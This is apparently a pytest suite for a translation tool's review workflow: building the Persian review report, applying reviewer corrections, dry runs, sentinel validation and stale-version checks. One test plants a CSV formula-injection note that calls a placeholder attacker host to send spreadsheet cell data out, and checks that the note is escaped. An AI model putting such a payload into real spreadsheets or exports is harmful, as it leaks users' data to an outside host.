from __future__ import annotations

import csv
import json
import re
import sqlite3
from pathlib import Path

import pytest
from lxml import html as lxml_html
from typer.testing import CliRunner

from tarjoman.cli.main import app
from tarjoman.core.config import load_settings
from tarjoman.core.cost import load_model_profile
from tarjoman.core.errors import RuntimeFailure
from tarjoman.pipeline.qa_pass import run_qa
from tarjoman.pipeline.translate_pass import TranslateOptions, run_translate
from tarjoman.review.corrections import apply_corrections
from tarjoman.review.report import ReviewBuildOptions, build_report

from .support import SmartProvider, count_versions, make_workspace

runner = CliRunner()
_SENTINEL = re.compile(r"⟨/?\d+⟩|⟦/?\d+⟧|\[\[#\d+\]\]|\[\[/\d+\]\]")


def _translate_chapter_one(home: Path) -> None:
    result = run_translate(
        root=home,
        slug="test-book",
        settings=load_settings(root=home),
        profile=load_model_profile(home / "configs/models/deepseek.yaml"),
        provider=SmartProvider(),
        options=TranslateOptions(chapters=[1], cost_mode="standard"),
    )
    assert result.coverage == 1.0


def _db(base: Path) -> sqlite3.Connection:
    connection = sqlite3.connect(base / "book.db")
    connection.row_factory = sqlite3.Row
    return connection


def _marked_segment(base: Path) -> sqlite3.Row:
    with _db(base) as connection:
        row = connection.execute(
            """
            SELECT s.*, t.fa_markup, t.fa_text
            FROM segments s
            JOIN chapters c ON c.id = s.chapter_id
            JOIN translations t ON t.segment_id = s.id AND t.is_current = 1
            WHERE c.idx = 1 AND s.nodes_json != '[]' AND t.fa_markup LIKE '%⟨%'
            ORDER BY s.idx LIMIT 1
            """
        ).fetchone()
    assert row is not None, "the fixture has a chapter-1 segment with inline markup"
    return row


def _write_corrections(path: Path, lines: list[dict[str, object]]) -> Path:
    path.write_text(
        "".join(json.dumps(line, ensure_ascii=False) + "\n" for line in lines),
        encoding="utf-8",
    )
    return path


def _flags_row(base: Path, segment_id: str) -> dict[str, str]:
    with (base / "review" / "flags.csv").open("r", encoding="utf-8", newline="") as handle:
        for row in csv.DictReader(handle):
            if row["segment_id"] == segment_id:
                return dict(row)
    raise AssertionError(f"{segment_id} is not in flags.csv")


def test_build_report_is_self_contained_and_filterable(
    isolated_home: Path, fixtures: dict[str, Path]
) -> None:
    make_workspace(isolated_home, fixtures)
    _translate_chapter_one(isolated_home)
    base = isolated_home / "books" / "test-book"
    settings = load_settings(root=isolated_home)

    result = build_report(
        root=isolated_home,
        slug="test-book",
        settings=settings,
        options=ReviewBuildOptions(chapter=1),
    )

    assert result.path == base / "review" / "report.html"
    assert result.path.is_file()
    assert result.coverage == 1.0
    assert result.rows >= 1
    document = result.path.read_text(encoding="utf-8")
    assert 'dir="rtl"' in document
    assert 'lang="fa"' in document
    assert "http://" not in document
    assert "https://" not in document
    assert "corrections.jsonl" in document
    for control in (
        'id="filter-chapter"',
        'id="filter-severity"',
        'id="filter-code"',
        'id="filter-risk"',
        'id="filter-only"',
        'id="filter-search"',
        'id="reviewer"',
        'id="download-corrections"',
    ):
        assert control in document

    with _db(base) as connection:
        segment_id = connection.execute(
            "SELECT s.id FROM segments s JOIN chapters c ON c.id = s.chapter_id "
            "WHERE c.idx = 1 ORDER BY s.idx LIMIT 1"
        ).fetchone()[0]
    assert str(segment_id) in document

    tree = lxml_html.fromstring(document)
    assert tree.get("dir") == "rtl"
    assert tree.get("lang") == "fa"
    assert tree.xpath('//article[contains(@class, "row")]')
    assert tree.xpath('//span[contains(@class, "sentinel")]')


def test_accept_inserts_human_version_and_resolves_issues(
    isolated_home: Path, fixtures: dict[str, Path]
) -> None:
    make_workspace(isolated_home, fixtures)
    _translate_chapter_one(isolated_home)
    base = isolated_home / "books" / "test-book"
    settings = load_settings(root=isolated_home)
    segment = _marked_segment(base)
    segment_id = str(segment["id"])
    before = count_versions(base / "book.db")[segment_id]

    run_qa(root=isolated_home, slug="test-book", settings=settings)
    with _db(base) as connection:
        connection.execute(
            """
            INSERT INTO issues (segment_id, chapter_id, stage, code, severity, message,
                                dedupe_key, status, created_at)
            VALUES (?, ?, 'qa', 'L02', 'error', 'planted for review', ?, 'open', '2026-01-01')
            """,
            (segment_id, int(segment["chapter_id"]), f"seg:{segment_id}:L02:planted"),
        )
        connection.commit()

    corrections = _write_corrections(
        base / "review" / "corrections.jsonl",
        [
            {
                "segment_id": segment_id,
                "action": "accept",
                "fa_markup": str(segment["fa_markup"]),
                "note": "kept the existing markup",
                "reviewer": "editor",
            }
        ],
    )
    result = apply_corrections(
        root=isolated_home,
        slug="test-book",
        settings=settings,
        corrections_path=corrections,
    )

    assert result.applied == 1
    assert result.new_versions == 1
    assert result.flags_updated >= 1
    assert count_versions(base / "book.db")[segment_id] == before + 1
    with _db(base) as connection:
        current = connection.execute(
            "SELECT * FROM translations WHERE segment_id = ? AND is_current = 1",
            (segment_id,),
        ).fetchone()
        older = connection.execute(
            "SELECT is_current FROM translations WHERE segment_id = ? AND version = ?",
            (segment_id, before),
        ).fetchone()
        open_issues = connection.execute(
            "SELECT COUNT(*) FROM issues WHERE segment_id = ? AND status = 'open'",
            (segment_id,),
        ).fetchone()[0]
        resolved = connection.execute(
            "SELECT resolved_by, resolution FROM issues WHERE segment_id = ? AND code = 'L02'",
            (segment_id,),
        ).fetchone()
    assert current["pass"] == "human"
    assert current["model"] == "human"
    assert older["is_current"] == 0
    assert open_issues == 0
    assert resolved["resolved_by"] == "editor"
    assert resolved["resolution"] == "kept the existing markup"
    assert _flags_row(base, segment_id)["reviewed"] == "true"


def test_needs_work_flags_segment_without_changing_text(
    isolated_home: Path, fixtures: dict[str, Path]
) -> None:
    make_workspace(isolated_home, fixtures)
    _translate_chapter_one(isolated_home)
    base = isolated_home / "books" / "test-book"
    settings = load_settings(root=isolated_home)
    segment = _marked_segment(base)
    segment_id = str(segment["id"])
    before = count_versions(base / "book.db")[segment_id]

    corrections = _write_corrections(
        base / "review" / "corrections.jsonl",
        [
            {
                "segment_id": segment_id,
                "action": "needs_work",
                "note": "the second clause lost the tense",
                "reviewer": "editor",
            }
        ],
    )
    result = apply_corrections(
        root=isolated_home,
        slug="test-book",
        settings=settings,
        corrections_path=corrections,
    )

    assert result.needs_work == 1
    assert result.new_versions == 0
    assert count_versions(base / "book.db")[segment_id] == before
    with _db(base) as connection:
        status = connection.execute(
            "SELECT status FROM segments WHERE id = ?", (segment_id,)
        ).fetchone()[0]
        issue = connection.execute(
            "SELECT * FROM issues WHERE segment_id = ? AND code = 'REVIEW_NEEDS_WORK'",
            (segment_id,),
        ).fetchone()
    assert status == "flagged"
    assert issue is not None
    assert issue["stage"] == "qa"
    assert issue["status"] == "open"
    assert issue["severity"] == "warn"
    assert issue["message"] == "the second clause lost the tense"
    assert _flags_row(base, segment_id)["reviewed"] == "true"

    run_qa(root=isolated_home, slug="test-book", settings=settings)
    with _db(base) as connection:
        persisted = connection.execute(
            "SELECT status FROM segments WHERE id = ?", (segment_id,)
        ).fetchone()[0]
        issue_status = connection.execute(
            "SELECT status FROM issues WHERE segment_id = ? AND code = 'REVIEW_NEEDS_WORK'",
            (segment_id,),
        ).fetchone()[0]
    assert persisted == "flagged"
    assert issue_status == "open"


def test_missing_segment_is_rejected_with_line_and_hint(
    isolated_home: Path, fixtures: dict[str, Path]
) -> None:
    make_workspace(isolated_home, fixtures)
    _translate_chapter_one(isolated_home)
    base = isolated_home / "books" / "test-book"
    settings = load_settings(root=isolated_home)
    before = count_versions(base / "book.db")

    corrections = _write_corrections(
        base / "review" / "corrections.jsonl",
        [
            {
                "segment_id": "c999.s9999",
                "action": "accept",
                "fa_markup": "متن",
                "reviewer": "editor",
            }
        ],
    )
    with pytest.raises(RuntimeFailure) as error:
        apply_corrections(
            root=isolated_home,
            slug="test-book",
            settings=settings,
            corrections_path=corrections,
        )
    message = str(error.value)
    assert ":1:" in message
    assert "c999.s9999" in message
    assert error.value.hint is not None
    assert count_versions(base / "book.db") == before


def test_unknown_sentinel_rejects_whole_file_without_writing(
    isolated_home: Path, fixtures: dict[str, Path]
) -> None:
    make_workspace(isolated_home, fixtures)
    _translate_chapter_one(isolated_home)
    base = isolated_home / "books" / "test-book"
    settings = load_settings(root=isolated_home)
    segment = _marked_segment(base)
    segment_id = str(segment["id"])
    before = count_versions(base / "book.db")

    broken = _SENTINEL.sub("⟨999⟩", str(segment["fa_markup"]), count=1)
    corrections = _write_corrections(
        base / "review" / "corrections.jsonl",
        [
            {
                "segment_id": segment_id,
                "action": "accept",
                "fa_markup": broken,
                "note": "broken sentinel",
                "reviewer": "editor",
            }
        ],
    )
    with pytest.raises(RuntimeFailure) as error:
        apply_corrections(
            root=isolated_home,
            slug="test-book",
            settings=settings,
            corrections_path=corrections,
        )
    message = str(error.value)
    assert "failed markup validation" in message
    assert "unknown_sentinel" in message
    assert segment_id in message
    assert error.value.hint is not None
    assert count_versions(base / "book.db") == before


def test_dry_run_validates_without_writing(
    isolated_home: Path, fixtures: dict[str, Path]
) -> None:
    make_workspace(isolated_home, fixtures)
    _translate_chapter_one(isolated_home)
    base = isolated_home / "books" / "test-book"
    settings = load_settings(root=isolated_home)
    segment = _marked_segment(base)
    segment_id = str(segment["id"])
    before = count_versions(base / "book.db")
    corrections = _write_corrections(
        base / "review" / "corrections.jsonl",
        [
            {
                "segment_id": segment_id,
                "action": "accept",
                "fa_markup": str(segment["fa_markup"]),
                "note": "dry run",
            },
            {
                "segment_id": segment_id,
                "action": "needs_work",
                "note": "also a dry run",
            },
        ],
    )

    result = apply_corrections(
        root=isolated_home,
        slug="test-book",
        settings=settings,
        corrections_path=corrections,
        dry_run=True,
    )

    assert result.applied == 1
    assert result.needs_work == 1
    assert result.new_versions == 0
    assert result.flags_updated == 0
    assert count_versions(base / "book.db") == before
    with _db(base) as connection:
        assert (
            connection.execute(
                "SELECT COUNT(*) FROM issues WHERE code = 'REVIEW_NEEDS_WORK'"
            ).fetchone()[0]
            == 0
        )
        assert (
            connection.execute(
                "SELECT COUNT(*) FROM translations WHERE pass = 'human'"
            ).fetchone()[0]
            == 0
        )


def test_cli_build_and_apply_round_trip(
    isolated_home: Path, fixtures: dict[str, Path]
) -> None:
    make_workspace(isolated_home, fixtures)
    _translate_chapter_one(isolated_home)
    base = isolated_home / "books" / "test-book"

    built = runner.invoke(app, ["review", "build", "--chapter", "1"])
    assert built.exit_code == 0, built.stdout
    assert (base / "review" / "report.html").is_file()
    assert "report" in built.stdout

    segment = _marked_segment(base)
    corrections = _write_corrections(
        base / "review" / "corrections.jsonl",
        [
            {
                "segment_id": str(segment["id"]),
                "action": "accept",
                "fa_markup": str(segment["fa_markup"]),
                "note": "CLI round trip",
            }
        ],
    )
    applied = runner.invoke(app, ["review", "apply", str(corrections)])
    assert applied.exit_code == 0, applied.stdout
    assert "applied 1" in applied.stdout
    with _db(base) as connection:
        assert (
            connection.execute(
                "SELECT COUNT(*) FROM translations WHERE pass = 'human' AND is_current = 1"
            ).fetchone()[0]
            == 1
        )

    dry = runner.invoke(app, ["review", "apply", str(corrections), "--dry-run"])
    assert dry.exit_code == 0, dry.stdout
    assert "validated" in dry.stdout

def test_review_state_survives_second_apply_and_rebuild(
    isolated_home: Path, fixtures: dict[str, Path]
) -> None:
    make_workspace(isolated_home, fixtures)
    _translate_chapter_one(isolated_home)
    base = isolated_home / "books" / "test-book"
    settings = load_settings(root=isolated_home)
    run_qa(root=isolated_home, slug="test-book", settings=settings)
    with _db(base) as connection:
        segments = connection.execute(
            """
            SELECT s.id, t.fa_markup
            FROM segments s
            JOIN translations t ON t.segment_id = s.id AND t.is_current = 1
            WHERE s.nodes_json != '[]' AND t.fa_markup LIKE '%⟨%'
            ORDER BY s.id LIMIT 2
            """
        ).fetchall()
    assert len(segments) == 2

    first = _write_corrections(
        base / "review" / "first.jsonl",
        [
            {
                "segment_id": str(segments[0]["id"]),
                "action": "accept",
                "fa_markup": str(segments[0]["fa_markup"]),
                "note": "first review",
            }
        ],
    )
    apply_corrections(
        root=isolated_home,
        slug="test-book",
        settings=settings,
        corrections_path=first,
    )
    second = _write_corrections(
        base / "review" / "second.jsonl",
        [
            {
                "segment_id": str(segments[1]["id"]),
                "action": "accept",
                "fa_markup": str(segments[1]["fa_markup"]),
                "note": "second review",
            }
        ],
    )
    apply_corrections(
        root=isolated_home,
        slug="test-book",
        settings=settings,
        corrections_path=second,
    )

    row = _flags_row(base, str(segments[0]["id"]))
    assert row["reviewed"] == "true"
    assert row["reviewer_note"] == "first review"

    build_report(root=isolated_home, slug="test-book", settings=settings)
    row = _flags_row(base, str(segments[0]["id"]))
    assert row["reviewed"] == "true"
    assert row["reviewer_note"] == "first review"


def test_reviewer_note_cannot_inject_csv_formula(
    isolated_home: Path, fixtures: dict[str, Path]
) -> None:
    make_workspace(isolated_home, fixtures)
    _translate_chapter_one(isolated_home)
    base = isolated_home / "books" / "test-book"
    settings = load_settings(root=isolated_home)
    segment = _marked_segment(base)
    corrections = _write_corrections(
        base / "review" / "formula.jsonl",
        [
            {
                "segment_id": str(segment["id"]),
                "action": "needs_work",
                "note": '=HYPERLINK("http://attacker/?x="&A1,"x")',
            }
        ],
    )

    apply_corrections(
        root=isolated_home,
        slug="test-book",
        settings=settings,
        corrections_path=corrections,
    )

    row = _flags_row(base, str(segment["id"]))
    assert row["reviewer_note"].startswith("'=")


def test_stale_correction_requires_force(
    isolated_home: Path, fixtures: dict[str, Path]
) -> None:
    make_workspace(isolated_home, fixtures)
    _translate_chapter_one(isolated_home)
    base = isolated_home / "books" / "test-book"
    settings = load_settings(root=isolated_home)
    segment = _marked_segment(base)
    with _db(base) as connection:
        version = int(
            connection.execute(
                "SELECT version FROM translations WHERE segment_id = ? AND is_current = 1",
                (str(segment["id"]),),
            ).fetchone()[0]
        )
    corrections = _write_corrections(
        base / "review" / "stale.jsonl",
        [
            {
                "segment_id": str(segment["id"]),
                "action": "accept",
                "fa_markup": str(segment["fa_markup"]),
                "translation_version": version - 1,
                "note": "stale report",
            }
        ],
    )

    with pytest.raises(RuntimeFailure) as raised:
        apply_corrections(
            root=isolated_home,
            slug="test-book",
            settings=settings,
            corrections_path=corrections,
        )
    assert "--force" in str(raised.value)

    result = apply_corrections(
        root=isolated_home,
        slug="test-book",
        settings=settings,
        corrections_path=corrections,
        force=True,
    )
    assert result.new_versions == 1
